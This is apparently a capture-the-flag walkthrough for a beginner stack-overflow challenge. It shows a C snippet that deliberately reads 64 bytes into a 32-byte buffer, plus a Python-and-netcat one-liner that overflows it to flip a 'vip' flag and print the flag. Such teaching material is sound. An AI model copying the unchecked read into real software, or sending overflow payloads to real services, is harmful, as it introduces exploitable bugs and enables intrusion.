# Walkthrough: Will Call

The intended lesson is the most basic memory-corruption bug: writing past the
end of a stack buffer overwrites whatever sits next to it.

1. Look at `will_call.c` (attached). The name is read into a 32-byte buffer,
   and a 4-byte `vip` flag sits immediately after it:

   ```c
   struct { char name[32]; int vip; } gate;
   gate.vip = 0;
   read(0, gate.name, 64);      // reads up to 64 bytes into a 32-byte field
   if (gate.vip != 0) { /* print the flag */ }
   ```

   `read` is allowed to write 64 bytes into `name`, but `name` only has room
   for 32. Bytes 33 and beyond land on `vip`.

2. So any input longer than 32 characters sets `vip` to something non-zero.
   The 33rd byte is the first one to reach it.

3. Send it straight at the server:

   ```sh
   python3 -c "print('A'*40)" | nc EVENT_HOST 8012
   ```

   or interactively, type 40 or so characters at the prompt. The program
   answers:

   ```
   VIP on file. Welcome back! Here are your field passes:
   BarSides{overflowed_onto_the_vip_list}
   ```

Notes:

- Exactly 32 characters is *not* enough (the buffer is full but `vip` is
  untouched). 33 is the smallest overflow that works.
- Running the downloaded binary locally prints a reminder that `flag.txt` is
  missing; that only lives on the server. Local testing confirms the overflow;
  the real flag comes from the live service.
- Built with `-fno-stack-protector -no-pie -O0` so there is no stack canary in
  the way. This is the gentle warm-up for the Intermediate (return-address
  control / ret2win) and Advanced (format string) Pwn challenges.
